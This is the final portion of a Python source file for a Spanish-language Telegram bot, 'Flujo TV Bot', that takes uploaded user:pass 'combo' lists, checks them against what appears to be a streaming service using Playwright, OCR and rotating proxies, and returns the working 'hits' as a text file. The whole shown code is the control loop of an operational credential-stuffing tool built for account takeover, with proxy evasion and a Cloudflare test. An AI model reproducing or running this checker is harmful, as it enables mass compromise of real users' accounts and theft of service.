    def worker(accounts, chat_id, prog_msg_id, use_proxy):
        try:
            hits, hits_lines = run_checker(accounts, chat_id, prog_msg_id, use_proxy)
            elapsed = time.time() - bot_state["_start_time"]
            if hits_lines:
                combo_text = "\n".join(hits_lines)
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                tg_send_doc(chat_id, f"hits_{ts}.txt", combo_text, caption=f"📦 {len(hits_lines)} hits — {datetime.now().strftime('%H:%M:%S')}")
            summary = f"━━━ <b>RESUMEN FINAL</b> ━━━\n📊 Total: {len(accounts)}\n💰 Hits: <b>{len(hits_lines)}</b>\n❌ Fails: {len(accounts) - len(hits_lines)}\n⏱ {int(elapsed//60)}m {int(elapsed%60)}s\n━━━━━━━━━━━━━━━━━━━━━━━"
            if prog_msg_id: tg_edit_msg(chat_id, prog_msg_id, summary, reply_markup=kb_main())
            else: tg_send_msg(chat_id, summary, reply_markup=kb_main())
            print(f"\n  [*] Check terminado: {len(hits_lines)} hits / {len(accounts)} total")
        except Exception as e:
            err_txt = f"❌ Error: {escape_html(str(e))}"
            print(f"  [✗] Checker error: {e}\n{traceback.format_exc()[-600:]}")
            try: tg_send_msg(chat_id, err_txt, reply_markup=kb_main())
            except: pass

    p = multiprocessing.Process(target=worker, args=(accounts, chat_id, prog_msg_id, use_proxy), daemon=True)
    p.start()
    bot_state["_process"] = p

# ════════════════════════════════════════════════════════════════════════
#  PROCESAR UPDATES
# ════════════════════════════════════════════════════════════════════════

def process_update(upd):
    global ADMIN_IDS
    msg = upd.get("message")
    cbq = upd.get("callback_query")

    if msg:
        chat_id = msg["chat"]["id"]
        user_id = msg.get("from", {}).get("id")
        text = msg.get("text", "")
        is_doc = "document" in msg

        if user_id and user_id not in ADMIN_IDS: ADMIN_IDS.append(user_id)

        if chat_id in waiting_combo:
            waiting_combo.discard(chat_id)
            use_proxy = not bot_state.get("force_no_proxy", False)
            bot_state["force_no_proxy"] = False
            
            if is_doc:
                doc = msg["document"]; file_id = doc["file_id"]
                file_data = tg_download_file(file_id)
                if file_data:
                    combo_text = file_data.decode("utf-8", errors="ignore")
                    accounts = parse_combo(combo_text)
                    if accounts:
                        tg_send_msg(chat_id, f"📄 Archivo: <b>{len(accounts)}</b> cuentas")
                        start_check(accounts, chat_id, use_proxy)
                    else: tg_send_msg(chat_id, "❌ Cuentas inválidas.", reply_markup=kb_main())
                else: tg_send_msg(chat_id, "❌ Error descargando.", reply_markup=kb_main())
                return
            elif text and not text.startswith("/"):
                accounts = parse_combo(text)
                if accounts: start_check(accounts, chat_id, use_proxy)
                else: tg_send_msg(chat_id, "❌ Formato: <code>user:pass</code>", reply_markup=kb_main())
                return
            else:
                waiting_combo.add(chat_id)
                tg_send_msg(chat_id, "📤 Envía el combo (texto o .txt)", reply_markup=kb_cancel())
                return

        if text == "/start":
            tg_send_msg(chat_id, "🎬 <b>Flujo TV Bot</b>\n\nEnvía tu combo.", reply_markup=kb_main())
        elif text == "/check":
            if bot_state["running"]: tg_send_msg(chat_id, "⏳ Ocupado.", reply_markup=kb_main())
            else:
                waiting_combo.add(chat_id)
                tg_send_msg(chat_id, "📤 <b>Envía combo (CON PROXY):</b>", reply_markup=kb_cancel())
        elif text in ["/local", "/checknoproxy"]:
            if bot_state["running"]: tg_send_msg(chat_id, "⏳ Ocupado.", reply_markup=kb_main())
            else:
                waiting_combo.add(chat_id)
                bot_state["force_no_proxy"] = True
                tg_send_msg(chat_id, "🌐 <b>Modo SIN PROXY (IP de tu VPS)</b>\n📤 Envía el combo:", reply_markup=kb_cancel())
        elif text == "/testcf":
            if bot_state["running"]: tg_answer_cb(cbq["id"], "Ocupado", show_alert=True) if cbq else None
            else: threading.Thread(target=test_cf_diagnostic, args=(chat_id,), daemon=True).start()
        elif text == "/stop":
            if bot_state["running"]:
                with open(STOP_FILE, 'w') as f: f.write("1")
                tg_send_msg(chat_id, "⏹ Deteniendo...")
            else: tg_send_msg(chat_id, "No hay check.", reply_markup=kb_main())
        elif text.startswith("/proxy"):
            parts = text.split()
            if len(parts) >= 5:
                PROXY["host"] = parts[1]; PROXY["port"] = int(parts[2]); PROXY["user"] = parts[3]; PROXY["pass"] = parts[4]
                tg_send_msg(chat_id, f"🔄 Proxy: <code>{PROXY['host']}:{PROXY['port']}</code>", reply_markup=kb_main())
            else: tg_send_msg(chat_id, f"Proxy:\n<code>{PROXY['host']}:{PROXY['port']}</code>\n<code>/proxy host port user pass</code>", reply_markup=kb_main())
        elif text.startswith("/rotate"):
            parts = text.split()
            if len(parts) == 2:
                global ROTATE_EVERY
                ROTATE_EVERY = int(parts[1])
                tg_send_msg(chat_id, f"🔁 Rotar cada {ROTATE_EVERY}", reply_markup=kb_main())

    elif cbq:
        chat_id = cbq["message"]["chat"]["id"]
        user_id = cbq.get("from", {}).get("id")
        data = cbq.get("data", "")
        msg_id = cbq["message"]["message_id"]
        if user_id and user_id not in ADMIN_IDS: ADMIN_IDS.append(user_id)
        
        if data == "send_combo":
            if bot_state["running"]: tg_answer_cb(cbq["id"], "⏳ Ocupado", show_alert=True)
            else:
                waiting_combo.add(chat_id); bot_state["force_no_proxy"] = False
                tg_edit_msg(chat_id, msg_id, "📤 <b>Envía combo (CON PROXY):</b>", reply_markup=kb_cancel())
                tg_answer_cb(cbq["id"])
        elif data == "send_local":
            if bot_state["running"]: tg_answer_cb(cbq["id"], "⏳ Ocupado", show_alert=True)
            else:
                waiting_combo.add(chat_id); bot_state["force_no_proxy"] = True
                tg_edit_msg(chat_id, msg_id, "🌐 <b>Modo SIN PROXY</b>\n📤 Envía el combo:", reply_markup=kb_cancel())
                tg_answer_cb(cbq["id"])
        elif data == "test_cf":
            if not bot_state["running"]: threading.Thread(target=test_cf_diagnostic, args=(chat_id,), daemon=True).start()
            else: tg_answer_cb(cbq["id"], "Ocupado", show_alert=True)
        elif data == "stop":
            if bot_state["running"]:
                with open(STOP_FILE, 'w') as f: f.write("1")
                tg_answer_cb(cbq["id"], "⏹ Deteniendo...")
            else: tg_answer_cb(cbq["id"], "No hay check", show_alert=True)
        elif data == "cancel_check":
            waiting_combo.discard(chat_id)
            tg_edit_msg(chat_id, msg_id, "🎬 <b>Flujo TV Bot</b>\n\nListo.", reply_markup=kb_main())
            tg_answer_cb(cbq["id"])

# ════════════════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════════════════

def main():
    print()
    print("  ╔═══════════════════════════════════════════════════╗")
    print("  ║  🎬 Flujo TV — Telegram Bot (VPS + Xvfb)        ║")
    print("  ╚═══════════════════════════════════════════════════╝")
    print()
    print("  [*] Instalando dependencias...")
    pw_ok, ocr_ok = setup_deps()
    if not pw_ok: print("  [✗] No se pudo instalar playwright"); sys.exit(1)

    display = os.environ.get("DISPLAY", ":99")
    print(f"  [*] DISPLAY={display}")
    try:
        r = subprocess.run(["xdpyinfo"], capture_output=True, text=True, timeout=5)
        if r.returncode != 0:
            print("  [*] Iniciando Xvfb...")
            subprocess.Popen(["Xvfb", display, "-screen", "0", "1280x1024x24", "-ac"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
    except FileNotFoundError:
        subprocess.Popen(["Xvfb", display, "-screen", "0", "1280x1024x24", "-ac"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

    print(f"  [✓] Playwright OK | OCR: {'✅' if ocr_ok else '❌'}")
    print(f"  [✓] Proxy: {PROXY['host']}:{PROXY['port']}")
    print(f"  [✓] Comandos: /check, /local, /testcf, /stop")
    print()
    tg_api("deleteWebhook", {"drop_pending_updates": True})
    print("  [✓] Bot iniciado...")
    print()

    offset = None
    while True:
        if bot_state["running"] and bot_state.get("_process") and not bot_state["_process"].is_alive():
            bot_state["running"] = False; bot_state["current_chat"] = None
            print("  [*] Check finalizado.")
        try:
            params = {"timeout": 35, "allowed_updates": '["message","callback_query"]'}
            if offset: params["offset"] = offset
            result = tg_api("getUpdates", params, timeout=40)
            if result.get("ok") and result.get("result"):
                for upd in result["result"]:
                    try: process_update(upd)
                    except Exception as e: print(f"  [!] Update error: {e}")
                    offset = upd["update_id"] + 1
        except urllib.error.URLError as e:
            print(f"  [!] Red: {e} — 5s..."); time.sleep(5)
        except Exception as e:
            print(f"  [!] Error: {e}"); time.sleep(3)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\n  [*] Bot detenido.")
    except Exception as e:
        print(f"\n  [✗] {e}"); traceback.print_exc()
